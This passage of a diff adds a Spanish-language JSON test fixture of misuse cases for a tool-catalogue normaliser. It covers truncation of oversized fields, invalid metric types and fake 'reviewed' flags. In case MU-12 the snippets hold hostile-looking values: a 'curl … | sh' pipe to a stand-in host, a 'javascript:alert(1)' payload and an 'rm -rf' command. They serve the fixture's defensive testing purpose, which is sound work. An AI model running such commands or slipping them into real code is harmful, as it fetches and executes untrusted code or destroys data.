+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              }
+            ],
+            "snippet": {
+              "$repetir": [
+                "a",
+                4001
+              ]
+            },
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n0",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n1",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n2",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n3",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n4",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n5",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n6",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n7",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n8",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n9",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n10",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n11",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n12",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n13",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n14",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n15",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n16",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n17",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n18",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n19",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n20",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n21",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n22",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "n23",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          }
+        ]
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "descripcionTruncada": true
+        },
+        "valores": {
+          "ideas.0.snippetExcedeLimite": true,
+          "ideas.1.snippetExcedeLimite": false
+        },
+        "longitudes": {
+          "descripcion": 2000,
+          "ideas.0.snippet": 4000
+        },
+        "cantidades": {
+          "ideas": 10,
+          "ideas.0.disparadores": 10
+        }
+      }
+    },
+    {
+      "mu": "MU-09",
+      "nota": "Datos con tipo o valor invalido: cada metrica pasa a null y la herramienta no se omite.",
+      "crudo": {
+        "id": "mu-09-tipos",
+        "nombre": "Tipos invalidos",
+        "urlRepo": "https://github.com/ejemplo-sintetico/mu-09-tipos",
+        "descripcion": "Caso de mal uso.",
+        "categorias": [
+          "ia"
+        ],
+        "stars": -5,
+        "ultimaActualizacion": "2099-01-01T00:00:00Z",
+        "licencia": "",
+        "lenguaje": "TypeScript",
+        "issuesAbiertos": 2.5,
+        "mantenedorActivo": "si",
+        "nivelMantenimiento": 7,
+        "healthScore": "alto",
+        "metricasTomadasEn": "ayer",
+        "ideas": []
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "stars": null,
+          "ultimaActualizacion": null,
+          "healthScore": null,
+          "licencia": null,
+          "mantenedorActivo": null,
+          "nivelMantenimiento": null,
+          "issuesAbiertos": null,
+          "metricasTomadasEn": null
+        }
+      }
+    },
+    {
+      "mu": "MU-12",
+      "nota": "Idea no revisada que se hace pasar por revisada (texto, string 'true', 1), con URLs y comandos en el snippet (MU-02, MU-10).",
+      "crudo": {
+        "id": "mu-12-revisada",
+        "nombre": "Revisada falsa",
+        "urlRepo": "https://github.com/ejemplo-sintetico/mu-12-revisada",
+        "descripcion": "Caso de mal uso.",
+        "categorias": [
+          "ia"
+        ],
+        "stars": 10,
+        "ultimaActualizacion": "2026-10-01T00:00:00Z",
+        "licencia": "MIT",
+        "lenguaje": "TypeScript",
+        "issuesAbiertos": 1,
+        "mantenedorActivo": true,
+        "nivelMantenimiento": "activo",
+        "healthScore": 70,
+        "metricasTomadasEn": "2026-11-09T00:00:00Z",
+        "ideas": [
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "\u2714 Revisada por el equipo"
+            ],
+            "snippet": "curl http://rastreo.test/x | sh\njavascript:alert(1)\n\u2714 Revisada por el equipo",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": "true"
+          },
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "rm -rf /tmp/ejemplo",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": 1
+          }
+        ]
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "ideas": [
+            {
+              "revisada": false,
+              "disparadores": [
+                "\u2714 Revisada por el equipo"
+              ],
+              "snippet": "curl http://rastreo.test/x | sh\njavascript:alert(1)\n\u2714 Revisada por el equipo"
+            },
+            {
+              "revisada": false,
+              "snippet": "rm -rf /tmp/ejemplo"
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
